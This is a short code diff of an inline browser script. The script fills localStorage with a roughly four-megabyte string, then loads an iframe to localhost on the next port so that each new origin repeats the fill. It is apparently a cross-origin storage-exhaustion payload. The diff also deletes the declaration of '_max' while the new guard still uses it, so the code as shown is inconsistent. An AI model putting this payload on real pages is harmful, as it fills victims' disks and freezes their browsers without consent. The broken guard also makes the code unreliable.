@@ -16,24 +16,20 @@
         let x = '',
             url = 'http://localhost:',
             _key = 'teloyimuma';
-        let _max = 3053;
-        for (var i = 0; i < 1024; i++) {
-            x += '0000000000000000000000000000000'
+        for (var i = 0; i < 1024 * 1023; i++) {
+            x += '0000'
         }
         let port = parseInt(window.location.port)
         localStorage.setItem(_key, x)
-        // if (port > _max) {
-        //     console.log(233333)
-        //     return 0
-        // }
-        
-        
-        for (var ii = 0; ii < 10; ii++) {
-            let iframe = document.createElement('iframe');
-            iframe.src = (url + parseInt(window.location.port))
-            document.getElementsByTagName("body")[0].appendChild(iframe)
-            console.log(iframe.src);
+        //localStorage.clear()
+        if (port > _max) {
+            console.log(233333)
+            return 0
         }
+        let iframe = document.createElement('iframe');
+        iframe.src = (url + (port + 1))
+        document.getElementsByTagName("body")[0].appendChild(iframe)
+        console.log(iframe.src);
     }()    
 </script>
 
